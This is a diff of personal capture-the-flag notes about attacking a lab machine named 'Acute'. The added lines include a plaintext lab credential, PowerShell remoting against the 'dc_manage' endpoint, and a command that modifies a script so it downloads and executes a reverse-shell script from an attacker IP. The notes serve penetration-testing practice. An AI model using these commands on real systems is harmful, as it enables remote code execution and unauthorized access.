@@ -45,13 +45,13 @@ Also:
 https://atsserver.acute.local/Acute_Staff_Access
 
 ![](remoteaccess.png)
+Login at - https://atsserver.acute.local/Acute_Staff_Access
 
 This disclosure narrows a possible route to escalate.
 ![](Loisisthetarget.png)
 
 Exiftooling docments is must to etch into my brain
 ![](exiftool.png)
-
 
 - Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage.
 
@@ -157,13 +157,14 @@ Never used meterpreter screenshare.
 The key important detail here is not there! I missed the `-ConfigationName dc_manage`
 
 `acute\imonks`
-`w3_4R3_th3_f0rce.`
+`W3_4R3_th3_f0rce.`
 
 ```powershell
 $pass = convertto-securestring -asplaintext -force -string "W3_4R3_th3_f0rce."
-$cred = new-object -typename system.management.automation.pscredential -arguementlist "acute\imonks",$pass
+# -arguementlist did not work for me
+$cred = new-object -typename system.management.automation.pscredential("acute\imonks",$pass)
 # Sometimes you need to use invoke command
-invoke-comand -computername ATSSERVER -ScriptBlock { <insertcommands> } -ConfigationName dc_manage -Credential $cred
+invoke-command -computername ATSSERVER -ScriptBlock { <insertcommands> } -ConfigurationName dc_manage -Credential $cred
 ```
 The Invoke-Command cmdlet **runs commands on a local or remote computer and returns all output from the commands, including errors**. Using a single Invoke-Command command, you can run commands on multiple computers. To run a single command on a remote computer, use the ComputerName parameter.
 
@@ -213,9 +214,22 @@ invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential 
 
 ![](hurrayforps.png)
 
-Ok it really does not like being replaced more than once.
+Ok it really does not like being replaced more than once.  I tried calling the meterpreter shell from `C:\util` in the script but that failed.
+
+
 2:30-55
 https://www.youtube.com/watch?v=IRSm7kalGPY
+
+```powershell
+invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((Get-Content -Path C:\Users\imonks\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.109/Invoke-PowerShellTcp.ps1")') | set-Content -Path C:\Users\imonks\desktop\wm.ps1 } 
+
+invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { C:\Users\imonks\desktop\wm.ps1 }
+```
+
+Being patient it took like five minutes, still waiting on the reverse shell. VPN is fine, still waiting
+![](callbackyeeeeeeeah.png)
+
+An hour later the shell that should return did not. A tad upset.
 
 ## PrivEsc
 
